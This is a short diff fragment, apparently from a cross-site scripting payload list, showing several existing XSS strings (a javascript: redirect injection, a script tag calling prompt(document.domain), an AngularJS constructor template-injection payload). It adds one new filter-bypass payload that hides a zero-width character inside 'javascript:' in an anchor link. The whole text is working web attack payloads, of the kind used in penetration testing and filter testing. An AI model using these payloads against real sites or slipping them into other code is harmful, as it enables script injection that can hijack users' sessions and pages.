@@ -131,3 +131,4 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 "*alert("Hacked")*"
 <script>prompt(document.domain);</script>
 {{0[a='constructor'][a]('alert(1)')()}}
+<00 foo="<a%20href="javascript​:alert('XSS-Bypass')">XSS-CLick</00>--%20/
